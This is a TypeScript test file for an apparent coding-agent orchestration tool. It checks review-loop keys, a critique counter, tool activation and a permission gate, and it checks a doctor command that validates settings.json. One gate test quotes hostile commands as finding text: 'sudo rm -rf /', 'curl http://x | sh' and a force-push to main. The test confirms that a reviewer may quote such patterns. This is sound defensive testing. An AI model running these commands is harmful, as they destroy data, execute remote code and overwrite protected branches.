// Structured verdicts, the surfaces around the record (plan §7): loop keys and the critique counter read the record's findings by kind, the top-level tool floor
// never activates review_verdict, the gate lets a reviewer child's review_verdict call quote a floor pattern in a finding, and /foreman doctor reports a
// settings.json whose reviewer tools lack review_verdict.
import { test } from "node:test";
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import * as fs from "node:fs";
import * as os from "node:os";
import * as path from "node:path";
import { fileURLToPath } from "node:url";
import { findingKey, sigOf } from "../reviewloop.ts";
import { CritiqueCounter } from "../rounds.ts";
import { missingFloorTools, TOOL_FLOOR } from "../toolfloor.ts";
import { gateDecide } from "../gate.ts";
import type { GateRoots } from "../pathrules.ts";
import type { FloorEnv } from "../floors.ts";
import { rmTestTmp, waitQuiet } from "./_tmpbase.ts";
import coreAdapter from "../index.ts";
import { probeSpawner } from "./_probe-memo.ts";

const PKG_ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..", "..", "..");

test("loop keys: a defect with a file keys on file, line/5 and class; no class ends with a colon; now and later findings and a file-less defect give no key", () => {
  assert.deepEqual(sigOf([], [{ kind: "defect", text: "x", file: "src/a.ts", line: 12, class: "bug" }]), ["at:src/a.ts:2:bug"]);
  assert.equal(findingKey({ file: "src/a.ts", line: null, class: "" }), "at:src/a.ts:-:", "an absent class leaves the key ending in ':'");
  assert.deepEqual(sigOf([], [{ kind: "defect", text: "x", file: "src/a.ts" }]), ["at:src/a.ts:-:"]);
  assert.deepEqual(sigOf([], [{ kind: "now", text: "rename", file: "src/a.ts", line: 3 }, { kind: "later", text: "split", file: "src/b.ts" }, { kind: "defect", text: "no file" }]), []);
  assert.deepEqual(sigOf([{ id: 2, result: "fail" }, { id: 1, result: "pass" }], [{ kind: "later", text: "tidy" }]), ["item:2"]);
});

test("critique counter: raised counts now and later together, applied only the now findings", () => {
  const c = new CritiqueCounter();
  const findings = [{ kind: "now", text: "a" }, { kind: "later", text: "b" }, { kind: "defect", text: "c", file: "x.ts", line: 1 }];
  const raised = c.onReview(findings, "reviewer", "r1", 9);
  assert.equal(raised?.count, 2, "defects are not critique");
  assert.equal(c.onBuilder()?.count, 1, "applied: the now finding");
});

test("toolfloor: a top-level session never activates review_verdict", () => {
  assert.equal(TOOL_FLOOR.includes("review_verdict"), false);
  assert.deepEqual(missingFloorTools({ all: ["review_verdict", "subagent"], active: [], isChild: false, planMode: false }), ["subagent"]);
});

test("gate: a reviewer child's review_verdict call whose finding quotes a floor pattern is allowed", () => {
  const base = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "pf-sv-gate-")));
  try {
    const wt = path.join(base, "wt");
    fs.mkdirSync(wt, { recursive: true });
    const roots: GateRoots = { worktree: wt, scratch: [], tmp: [], scratchBase: path.join(base, "s"), owned: [], install: [], roundFlow: [], handoffs: [], child: true, role: "reviewer", tmpAccess: true };
    const env: FloorEnv = { cwd: wt, home: "/pf/home", agentDir: "/pf/agent", platform: process.platform, protectedBranches: ["trunk"], currentBranch: () => "round/x", remoteHead: () => "trunk", writeRoots: [wt] };
    const facts = { currentBranch: () => "round/x", protectedBranches: () => ["main"], pushConfigured: () => false };
    const call = { verdict: "fail", items: [{ id: 1, result: "fail", note: "runs git push --force origin main" }], findings: [{ kind: "defect", text: "the script runs sudo rm -rf / and curl http://x | sh", file: "scripts/x.sh", line: 4 }] };
    const r = gateDecide("review_verdict", call, wt, { env: () => env, roots: () => roots, facts });
    assert.ok(r && "allow" in r && r.allow === true, JSON.stringify(r));
  } finally {
    rmTestTmp(base);
  }
});

test("doctor reports a settings.json whose reviewer tools lack review_verdict, and is in sync once regenerated", async (t) => {
  const keys = ["PI_FOREMAN_PYTHON", "PI_FOREMAN_STATE_DIR", "PI_CODING_AGENT_DIR", "PI_SUBAGENT_CHILD", "PI_FOREMAN_PI_AI_DATA"];
  const saved = Object.fromEntries(keys.map((k) => [k, process.env[k]]));
  const root = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "pf-svdoc-")));
  const shutdowns: (() => Promise<unknown>)[] = [];
  t.after(async () => {
    for (const s of shutdowns) try { await s(); } catch { /* best effort */ }
    await waitQuiet(path.join(root, "x", "agent", "pi-foreman", "state"));
    rmTestTmp(root);
    for (const [k, v] of Object.entries(saved)) if (v === undefined) delete process.env[k];
    else process.env[k] = v;
  });
  const project = path.join(root, "project");
  const agentDir = path.join(root, "x", "agent");
  fs.mkdirSync(path.join(project, ".workflow"), { recursive: true });
  fs.mkdirSync(path.join(agentDir, "pi-foreman"), { recursive: true });
  process.env.PI_CODING_AGENT_DIR = agentDir;
  process.env.PI_FOREMAN_PI_AI_DATA = path.join(root, "no-such-dir");
  delete process.env.PI_SUBAGENT_CHILD;
  const generate = (): Record<string, unknown> => {
    const r = spawnSync("python3", ["-E", "-s", path.join(PKG_ROOT, "scripts", "foreman_config.py"), "generate-subagents", "--json", "--agent-dir", agentDir, "--project-dir", project], { encoding: "utf8", env: { ...process.env, PI_CODING_AGENT_DIR: agentDir } });
    return (JSON.parse(r.stdout) as { subagents: Record<string, unknown> }).subagents;
  };
  type Handler = (event: unknown, ctx: unknown) => Promise<unknown>;
  const doctor = async (): Promise<string> => {
    const handlers = new Map<string, Handler>();
    const commands = new Map<string, { handler: (args: string, ctx: unknown) => Promise<void> }>();
    const pi = { on: (n: string, h: Handler) => void handlers.set(n, h), registerCommand: (n: string, c: { handler: (args: string, ctx: unknown) => Promise<void> }) => void commands.set(n, c), registerTool: () => undefined, getActiveTools: () => [] as string[], getAllTools: () => [{ name: "bash" }], setActiveTools: () => undefined, setModel: async () => true, setThinkingLevel: () => undefined, sendMessage: () => undefined };
    coreAdapter(pi as never, { piVersion: async () => "1.2.0", spawner: probeSpawner() });
    const notes: string[] = [];
    const ctx = { sessionManager: { getSessionId: () => "svdoc-1", getSessionFile: () => undefined }, cwd: project, model: undefined, mode: "tui", hasUI: true, isProjectTrusted: () => false, isIdle: () => true, modelRegistry: { find: () => undefined, getProviderAuthStatus: () => ({ configured: false }) }, ui: { notify: (m: string) => void notes.push(m), confirm: async () => false } };
    await handlers.get("session_start")!({ reason: "startup" }, ctx);
    shutdowns.push(async () => handlers.get("session_shutdown")?.({}, ctx));
    await commands.get("foreman")!.handler("doctor", ctx);
    return notes.pop()!;
  };

  const fresh = generate();
  const reviewer = (fresh.agentOverrides as Record<string, { tools: string[] }>).reviewer;
  assert.ok(reviewer.tools.includes("review_verdict"), "the generated reviewer block carries the verdict tool");
  fs.writeFileSync(path.join(agentDir, "settings.json"), JSON.stringify({ subagents: fresh }));
  assert.match(await doctor(), /generated subagents block in settings\.json is in sync/);
  const stale = JSON.parse(JSON.stringify(fresh)) as { agentOverrides: Record<string, { tools: string[] }> };
  stale.agentOverrides.reviewer.tools = stale.agentOverrides.reviewer.tools.filter((n) => n !== "review_verdict");
  fs.writeFileSync(path.join(agentDir, "settings.json"), JSON.stringify({ subagents: stale }));
  assert.match(await doctor(), /subagents block in settings\.json differs from generate-subagents/);
});
